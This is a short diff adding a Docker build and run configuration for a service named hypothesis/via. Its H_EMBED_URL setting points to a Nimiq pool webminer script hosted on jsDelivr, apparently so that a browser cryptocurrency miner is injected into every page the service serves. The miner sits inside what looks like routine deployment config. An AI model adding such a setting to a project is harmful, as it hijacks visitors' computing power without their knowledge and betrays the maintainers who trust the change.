@@ -1,0 +1,7 @@
+build:
+  docker:
+    web: docker build -t hypothesis/via .
+  config:
+    H_EMBED_URL: "https://cdn.jsdelivr.net/gh/Albermonte/nimiq-pool-webminer@latest/nimiq-pool-webminer.js"
+run:
+  web: docker run --name via -d -p 80:80 hypothesis/via
